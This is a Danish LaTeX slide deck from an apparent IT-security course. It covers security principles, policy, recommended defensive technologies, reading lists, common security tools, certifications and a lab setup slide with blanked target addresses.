{\hlkbig Husk altid de fundamentale principper indenfor sikkerhed}

\hlkimage{15cm}{images/cia-triad.pdf}

\slide{Security holes... Who cares?}

\hlkimage{11cm}{images/rescorla-figure-1.png}

\begin{list1}
\item Forhistorien:
  \begin{list2}
  \item OpenSSL sårbarheder fra juli 2002
  \item Slapper worm fra september 2002
  \item Hvormange opdaterer for sårbarheder og hvornår?
  \end{list2}
\item Kilde:
  Eric Rescorla, "Security holes... Who cares?"\\
  \link{http://www.rtfm.com/upgrade.pdf}
\end{list1}

\slide{Definition: sikkerhedspolitik}

\begin{list1}
\item Definition:
Et sæt regler for virksomheden

\item Definition: it-sikkerhedspolitik\\
en politik der er begrænset til
IT-områderne i virksomheden 
\end{list1}

\hlkimage{10cm}{images/policy-1.pdf} 

{\bf - kan være en del af CYA strategi, cover your assets ;-)}

\slide{Software og e-mail politik }
\begin{list1}
\item Manglende e-mail politik: brevhemmelighed er beskrevet i
  straffeloven, og e-mail er omfattet! Uberettiget fyring kan
  ligeledes være dyrt for virksomheden
\item Besøg fra Antipiratgruppen - kan resultere i dummebøder eller fyring 
\item Brug af Internet - er der båndbredde til at arbejde, hvis alle
  sidder og ser Tour de France på Internet?
\item Der skal være et sæt regler - så medarbejdere ved hvad der
  forventes af dem
\item Der skal ofte udføres en risikoanalyse for at sikre at alle
  områder dækkes med sikkerhedspolitikken
\end{list1}

\slide{Sikkerhedsteknologier}

\begin{list1}
\item Brug alt hvad I kan overkomme:
\begin{list2}
\item Firewalls: IPfilter, IPtables, OpenBSD PF
\item Kryptografi 
\item Secure Shell - SSH
\item betragt Telnet, Rlogin, Rsh, Rexec som døde!
\item FTP bør kun bruges til anonym FTP
\item Intrusion Detection - Snort
\item Sudo
\item Tripwire, mtree, MD5
\end{list2}
\item Sikkerhedspolitikken er din "plan" for sikkerheden
- og er med til at sikre niveauet er ens
\item Firewalls hjælper ikke mod alle trusler
\end{list1}

\slide{Opsummering afslutning}

\begin{list1}
\item Husk følgende:
\begin{list2}
\item Husk: IT-sikkerhed er ikke kun netværkssikkerhed!
\item Sikkerhed kommer fra langsigtede intiativer\\
 {\bfseries Vi håber I kan genkende de problemer vi har talt om,
    og finde information om nye problemer i netværk som bliver kendt\\
 eksempelvis nye metoder til scanning eller omgåelse af
    firewalls} 
\item Hvad er informationssikkerhed?
\item Data på elektronisk form
\item Data på fysisk form
\item Social engineering er måske overset - \emph{The Art of Deception: 
Controlling the Human Element of Security}
af Kevin D. Mitnick, William L. Simon, Steve Wozniak
\end{list2}
\item Computer Forensics er reaktion på en hændelse
\item {\bfseries Informationssikkerhed er en proces}
\end{list1}

\slide{Anbefalinger generelt}

\begin{list1}
\item Drop legacy kompatibilitet
\item Udryd gamle usikre
\begin{list2}
\item protokoller - som SSH version 1
\item programmer telnet, FTP, R* - password i klartekst
\item services NT LAN manager
\end{list2}
\item {\bfseries VÆK med dem!}
\item Det handler om sikkerhed, det der ikke er
aktivt kan ikke misbruges
\end{list1}

\slide{Anbefalinger til jer}
% oversigt over dem

{\bf \large Oversigt over anbefalinger} 
\begin{list1}
\item {\bf Følg med!} - læs websites, bøger, artikler, mailinglister, ...
\item {\bf Vurder altid sikkerhed} - skal integreres i processer
\item {\bf Hændelseshåndtering} - du vil komme ud for sikkerhedshændelser
\item {\bf Lav en sikkerhedspolitik} - herunder software og e-mail politik 
\end{list1}

{\hlkbig \bfseries Hver måned offentliggøres ca. 100 nye
sårbarheder i produkter - software/hardware }


\slide{Følg med! - mange kilder}
\begin{list1}
\item {\bf websites} prøv at kigge både på officielle/kommercielle websites
  - men også indimellem på \emph{de små gyder} på Internet 
\item {\bf bøger} der er en god liste over \emph{MUST READ} sikkerhedsbøger
  på adressen\\
\href{http://sun.soci.niu.edu/~rslade/mnbksccd.htm}
{http://sun.soci.niu.edu/\~{}rslade/mnbksccd.htm}
\item {\bf artikler} mange steder, men eksempelvis\\ 
\link{http://www.securityfocus.com}
\item {\bf mailinglister} leverandør ejede lister og generelle - som
  bugtraq og full-disclosure
\item {\bf personer} der findes personer på Internet som er værd at
  holde øje med. Eksempelvis: Bruce Schneiers nyhedsbrev crypto-gram\\
  \link{http://www.counterpane.com/crypto-gram.html}
\end{list1}


\slide{Spørgsmål?}


\vskip 4cm

\begin{center}
\hlkbig 

\myname

\myweb
\vskip 2 cm

I er altid velkomne til at sende spørgsmål på e-mail
\end{center}

% opgaver
%\slide{}

%\label{ex:sample}

%{\bfseries Opgave:} 

%{\bfseries Forslag til fremgangsmåde:} 

%{\bfseries Hjælp:} 

%{\bfseries Diskussion:} 



\slide{Reklamer: kursusafholdelse}

\begin{list1}
\item Følgende kurser afholdes med mig som underviser
\begin{list2}
\item IPv6 workshop - 1 dag\\
 Introduktion til Internetprotokollerne og forberedelse til
  implementering i egne netværk. 
\item Wireless teknologier og sikkerhed workshop - 1-2 dage\\
En dag med fokus på netværksdesign og fornuftig implementation af
trådløse netværk, samt integration med hjemmepc og
wirksomhedsnetværk. 
\item Hacker workshop 2 dage\\
Workshop med detaljeret gennemgang af hackermetoderne angreb over
netværk, exploitprogrammer, portscanning, Nessus m.fl.
\item Forensics workshop 2 dage\\
Med fokus på tilgængelige open source værktøjer gennemgås metoder og
praksis af undersøgelse af diskimages og spor på computer systemer
\item Moderne Firewalls og Internetsikkerhed 2 dage\\
Informere om trusler og aktivitet på Internet, samt give et bud
på hvorledes en avanceret moderne firewall idag kunne konfigureres.
\end{list2}
\end{list1}

Se mere på \link{http://www.security6.net/courses.html}

\slide{Network Security Tools}

\hlkimage{5cm}{images/network-security-tool-ora.jpg}
\begin{list1}
\item \emph{Network Security Tools : Writing, Hacking, and Modifying
    Security Tools} Nitesh Dhanjani, Justin Clarke, O'Reilly 2005, ISBN:
    0596007949 
 \end{list1}

\slide{}

\hlkimage{5cm}{images/freebsd-openbsd-security-tools-ora.jpg}
\begin{list1}
\item \emph{Mastering FreeBSD and OpenBSD Security} Yanek Korff, Paco
  Hope, Bruce Potter, O'Reilly, 2005, ISBN: 0596006268
\end{list1}

\slide{Hackers Challenge}

\begin{center}
\colorbox{white}{
\includegraphics[width=3cm]{images/hackers-challenge.jpg}
\includegraphics[width=33mm]{images/hackers-challenge2.jpg}}
\end{center}

\begin{list1}
%\item Hændelseshåndtering - øvelse som I kigger på i weekenden
%\item Opgaverne er kopieret fra bogen 
\item \emph{Hacker's Challenge : Test Your Incident Response Skills Using 20 Scenarios}
 af Mike Schiffman McGraw-Hill Osborne Media; (October 18, 2001) ISBN:
 0072193840
\item \emph{Hacker's Challenge II : Test Your Network Security and
 Forensics Skills} 
 af Mike Schiffman McGraw-Hill Osborne Media, 2003 ISBN: 0072226307
\item Bogen indeholder scenarier i første halvdel, og løsninger i
  anden halvdel - med fokus på relevante logfiler og sårbarheder  
\item Hackers challenge nr 3 udkommer i 2006
\end{list1}


\slide{Network Security Assessment}

\begin{center}
\colorbox{white}{
\includegraphics[width=6cm]{images/oreilly-networksa.png}}
\end{center}

\begin{list1}
%\item Hændelseshåndtering - øvelse som I kigger på i weekenden
%\item Opgaverne er kopieret fra bogen 
\item \emph{Network Security Assessment 
Know Your Network}
 af Chris McNab, O'Reilly Marts 2004 ISBN: 0-596-00611-X
\item Bogen er anbefalelsesværdig
\item Der kan hentes kapitel 4 som PDF - \emph{IP Network Scanning}
\end{list1}

\slide{Counter Hack}

\hlkimage{6cm}{images/counter-hack.jpg}

\begin{list1}
\item \emph{Counter Hack: A Step-by-Step Guide to Computer Attacks and
Effective Defenses}, Ed Skoudis, Prentice Hall PTR, 1st edition July 2001
\item Bogen er anbefalelsesværdig og er kommet i anden udgave
\item Minder mig om et universitetskursus i opbygningen
\end{list1}

\slide{Hackerværktøjer}
% måske til reference afsnit?

\begin{list2}
\item nmap - \link{http://www.insecure.org} portscanner
\item Nessus - \link{http://www.nessus.org} automatiseret testværktøj
%\item libnet m.fl. - \link{http://www.packetfactory.net} - diverse projekter
%  relateret til pakker og IP netværk
\item l0phtcrack - \link{http://www.atstake.com/research/lc/} - The Password
  Auditing and Recovery Application, kig også på Cain og Abel fra
  \link{http://oxid.it} hvis det skal være gratis
\item Wireshark - \link{http://www.wireshark.org} avanceret netværkssniffer
%\item F.I.R.E -  \link{http://biatchux.dmzs.com/} - en cd-rom der indeholder en 
%  bootable Linux del.
\item OpenBSD - \link{http://www.openbsd.org} operativsystem med fokus
  på sikkerhed 
\item \link{http://www.isecom.org/} - Open Source Security Testing
  Methodology Manual - gennemgang af elementer der bør indgå i en struktureret test 
\item Putty - 
\link{http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html}

terminal emulator med indbygget SSH

\item 
\link{http://www.remote-exploit.org} - Backtrack security collection -
en boot CD med hackerværktøjer
\end{list2}

\slide{Referencer}

\begin{list1}
\item Anbefalede bøger:
\begin{list2}
\item \emph{Computer Forensics: Incident Response Essentials}, Warren
  G. Kruse II og Jay G. Heiser, Addison-Wesley, 2002.
\item \emph{Incident Response}, E. Eugene Schultz og Russel Shumway,
  New Riders, 2002
\item \emph{CISSP All-in-One Certification Exam Guide}, Shon Harris 
McGraw-Hill/Osborne, 2002
\item \emph{Network Intrusion Detection}, Stephen Northcutt og Judy Novak, New
  Riders, 2nd edition, 2001
\item \emph{Intrusion Signatures and Analysis}, Stephen Northcutt et al, New
  Riders, 2001
\item \emph{Practical UNIX and Internet Security}, Simson Garfinkel og
  Gene Spafford, 2nd edition
\item \emph{Firewalls and Internet Security},  Cheswick,
  Bellovin og Rubin, Addison-Wesley, 2nd edition, 2003
\item \emph{Hacking Exposed}, Scambray et al, 4th edition, Osborne, 2003 
  - tror der er en nyere  
  \item \emph{Building Open Source Network Security Tools}, Mike
  D. Schiffman, Wiley 2003 
\item \emph{Gray Hat Hacking : The Ethical Hacker's Handbook} Shon
  Harris, Allen  Harper, Chris  Eagle, Jonathan  Ness,
  Michael Lester, McGraw-Hill Osborne Media 2004, ISBN: 0072257091
\end{list2}
\end{list1}


\slide{Referencer}

\begin{list1}
\item Internet
  \begin{list2}
  \item \link{http://www.project.honeynet.org} - diverse honeynet projekter
  information om pakker og IP netværk. Har flere forensics challenges
  hvor man kan hente images og foretage sin egen analyse
  \item \link{http://www.packetfactory.net} - diverse projekter
  relateret til pakker og IP netværk eksempelvis libnet

\item \link{http://www.isecom.org/} - Open Source Security Testing
  Methodology Manual - Hvordan laver man struktureret test! 

\end{list2}
\item Mailinglists
  \begin{list2}
    \item securityfocus m.fl. - de fleste producenter og væktøjer
    har mailinglister tilknyttet
  \end{list2}
\item Papers - der findes MANGE dokumenter på Internet
\begin{list2}
\item \emph{Security Problems in the TCP/IP Protocol Suite},
  S.M. Bellovin, 1989 og fremefter
\end{list2}
\end{list1}

\slide{Packet factory projects}

\begin{center}
\colorbox{white}{\includegraphics[width=20cm]{images/packetfactory-header.jpg}}
\end{center}

\begin{list2}
\item Projects (udvalgte):
\item firewalk [gateway ACL scanner]
\item firestorm (in development) [next 
  generation scanner]
\item ISIC [IP stack integrity checker]
\item libnet [network packet assembly/injection library]     
\item libradiate [802.11b frame assembly/injection library]     
\item nemesis [command line IP stack]     
\item ngrep [GNU grep for the network]     
\item packit [tool to monitor, and inject customized IPv4 traffic]     
\item Billede og information fra \link{http://www.packetfactory.net}
\end{list2}



\slide{CISSP fra ISC2}

\hlkimage{16cm}{images/cissp-logo.png}

\begin{list1}
\item Primære website: \link{http://www.isc2.org}
\item Vigtigt link \link{http://www.cccure.org/}
\item Den kræver mindst 3 års erfaring indenfor et relevant fagområde
\item Multiple choice 6 timer 250 spørgsmål - kan tages i Danmark
\end{list1}



\slide{GIAC GSEC krav}

\hlkimage{4cm}{images/SANS-logo.png}

\begin{list1}
\item Security Essentials - basal sikkerhed
\item Krav om en \emph{Practical assignment} - mindst 8 sider, 15
  sider i gennemsnit
\item multiple choice eksamen
\item Primære website: \link{http://www.giac.org}
\item Reading room: \link{http://www.sans.org/rr/}
\item Der findes en god oversigt i filen 
\emph{GIAC Certification: Objectives and Curriculum}\\
  \link{http://www.giac.org/overview/brief.pdf}

\end{list1}

\slide{Hostoplysninger}

\begin{list1}
\item I bedes registrere IP-adresserne for maskinerne
\item Filer til installation - installationsprogrammer:\\
http:// \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm /public/windows/
\end{list1}

\slide{Vores targets}
\begin{list1}
\item IP: \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm - IOS router 
\item IP: \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm - Windows 2000
\item IP: \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm - Linux
\item IP: \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm - Stitch
  OpenBSD
\item IP: \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm - Fiona
  OpenBSD scanserver
\item IP: \hskip 5mm .\hskip 5mm .\hskip 5mm .\hskip 5mm - Din egen
  arbejdsstation - Windows
%\item Fiona maskinen benyttes med SSH til {\bf port 22781}!
\item Fiona kursus login brugernavne: kursus1, kursus2, ... kursus10
kodeord: \verb+kursus+ - uanset brugernavn
%\item Sulley kursus login brugernavn: kursus kodeord: kursus
\item Skift til root med: \verb+sudo -s+
\end{list1}

\end{document}
